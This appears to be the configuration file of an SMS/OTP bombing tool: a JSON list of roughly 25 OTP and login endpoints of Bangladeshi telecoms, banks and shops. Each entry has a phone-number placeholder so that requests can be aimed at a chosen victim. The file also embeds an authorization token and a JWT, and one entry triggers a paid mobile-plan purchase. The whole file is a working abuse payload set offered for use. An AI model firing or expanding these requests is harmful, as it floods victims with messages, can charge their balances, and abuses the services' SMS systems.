{
    "info": "Get latest APIs from <https://proxy.neopandora.com/v1.json>",
    "apis": [
        {
            "id": "1",
            "name": "QuizGiri",
            "url": "https:\/\/developer.quizgiri.xyz\/api\/v2.0\/send-otp?phone=*****&country_code=+880&fcm_token=null",
            "method": "post",
            "body": "",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "4",
            "name": "Shudokko",
            "url": "http:\/\/lpin.dev.mpower-social.com:6001\/usermodule\/otp_mobile\/?mobile_no=*****&email=xbomber_public%40gmail.com&verification_type=registration",
            "method": "get",
            "body": "",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "5",
            "name": "Web Access",
            "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
            "method": "post",
            "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
            "headers": {
                "content-type": "application\/json",
                "content-length": "48"
            }
        },
        {
            "id": "6",
            "name": "CINESPOT",
            "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-*****\/operator-All\/send",
            "method": "GET",
            "body": "",
            "wait_time": 0,
            "identifier": "",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded"
            }
        },
        {
            "id": "7",
            "name": "GP",
            "url": "https:\/\/api.mygp.cinematic.mobi\/api\/v1\/otp\/88*****\/SBENT_3GB7D",
            "method": "post",
            "body": "",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "8",
            "name": "CIRCLE",
            "url": "https:\/\/circle.robi.com.bd\/mylife\/gateway\/register_fcm.php?regId&msisdn=88*****",
            "method": "post",
            "body": "",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "9",
            "name": "Tap",
            "url": "https:\/\/api.bdkepler.com\/api_middleware-0.0.1-RELEASE\/registration-generate-otp",
            "method": "post",
            "body": "{\"deviceId\":\"7dtdhid45c0f5678\",\"deviceInfo\":{\"deviceInfoSignature\":\"D0923F3GDHJXJDTIHFDTIGGHURHFATGHIYAGTAJ\",\"deviceId\":\"7d8b0agi0g0f0568\",\"firebaseDeviceToken\":\"\",\"manufacturer\":\"MI\",\"modelName\":\"NOTE 10\",\"osFirmWireBuild\":\"\",\"osName\":\"Android\",\"osVersion\":\"10\",\"rootDevice\":0},\"operator\":\"Gp\",\"walletNumber\":\"*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "10",
            "name": "GP2",
            "url": "https:\/\/weblogin.grameenphone.com\/backend\/api\/v1\/otp",
            "method": "post",
            "body": "{\"msisdn\":\"*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "11",
            "name": "Shajgoj",
            "url": "https:\/\/bk.shajgoj.com\/api\/customers\/send-otp",
            "method": "post",
            "body": "{\"phone\":\"*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "12",
            "name": "Arogga",
            "url": "https:\/\/api.arogga.com\/v1\/auth\/sms\/send",
            "method": "post",
            "body": "mobile=%2B88*****&fcmToken=&referral=",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded"
            }
        },
        {
            "id": "13",
            "name": "GP Flex Plan",
            "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=*****",
            "method": "post",
            "body": "{\"phone\":\"*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "14",
            "name": "GP Flexi Plan",
            "url": "https:\/\/gpwebms.grameenphone.com\/api\/v1\/flexiplan-purchase\/activation",
            "method": "post",
            "body": "{\"payment_mode\":\"mobile_balance\",\"longevity\":7,\"voice\":25,\"data\":1536,\"fourg\":0,\"bioscope\":0,\"sms\":0,\"mca\":0,\"msisdn\":\"*****\",\"price\":93.52,\"bundle_id\":17130,\"is_login\":false}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "15",
            "name": "Ecuriar",
            "url": "https:\/\/backoffice.ecourier.com.bd\/api\/web\/individual-send-otp?mobile=*****",
            "method": "get",
            "body": "",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded"
            }
        },
        {
            "id": "16",
            "name": "China Online",
            "url": "https:\/\/chinaonlineapi.com\/api\/v1\/get\/otp?phone=*****",
            "method": "get",
            "body": "",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded",
                "token": "gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219"
            }
        },
        {
            "id": "17",
            "name": "Shikho",
            "url": "https:\/\/api.shikho.com\/auth\/v2\/send\/sms",
            "method": "post",
            "body": "{\"phone\":\"*****\",\"type\":\"student\",\"auth_type\":\"signup\",\"vendor\":\"shikho\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "18",
            "name": "Qcom",
            "url": "https:\/\/auth.qcoom.com\/api\/v1\/otp\/send",
            "method": "post",
            "body": "{\"mobileNumber\":\"+88*****\"}",
            "headers": {
                "content-type": "application\/json",
                "Referer": "https:\/\/qcoom.com"
            }
        },
        {
            "id": "19",
            "name": "Ajkerdeal",
            "url": "https:\/\/api.ajkerdeal.com\/Recover\/RetrivePassword\/customersignup=null",
            "method": "post",
            "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\":\"*****\", \"Type\": 2}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "20",
            "name": "Circel",
            "url": "https:\/\/circle.robi.com.bd\/mylife\/gateway\/register_fcm.php?regId&msisdn=88*****",
            "method": "get",
            "body": "",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded"
            }
        },
        {
            "id": "21",
            "name": "Arogga",
            "url": "https:\/\/api.arogga.com\/v1\/auth\/sms\/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
            "method": "post",
            "body": "mobile=+88*****&fcmToken=&referral=",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "22",
            "name": "Cinespot",
            "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-*****\/operator-Robi\/send",
            "method": "get",
            "body": "",
            "headers": {
                "content-type": "application\/x-www-form-urlencoded"
            }
        },
        {
            "id": "23",
            "name": "Dhaka",
            "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",
            "method": "post",
            "body": "{ \"AccessToken\": \"\", \"TrackingNo\": \"\", \"mobileNo\": \"*****\", \"otpSms\": \"\", \"product_id\": \"250\", \"requestChannel\": \"MOB\", \"trackingStatus\": 5 }",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "24",
            "name": "Applink",
            "url": "https:\/\/applink.com.bd\/appstore-v4-server\/login\/otp\/request",
            "method": "post",
            "body": "{\"msisdn\":\"88*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "25",
            "name": "Sadhin Music",
            "url": "https:\/\/shadhinapp.com\/v3\/api\/sms",
            "method": "post",
            "body": "{\"phone\":\"*****\"}",
            "headers": {
                "content-type": "application\/json"
            }
        },
        {
            "id": "26",
            "name": "ROBI WEB",
            "url": "https:\/\/webapi.robi.com.bd\/v1\/send-otp",
            "method": "post",
            "body": "{\"phone_number\":\"*****\"}",
            "headers": {
                "content-type": "application\/json",
                "Authorization": " Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"
            }
        },
        {
            "id": "27",
            "name": "Chardike",
            "url": "https:\/\/api.chardike.com\/api\/otp\/send",
            "method": "post",
            "body": "{\"phone\":\"*****\",\"otp_type\":\"login\"}",
            "headers": {
                "content-type": "application\/json"
            }
        }
    ]
}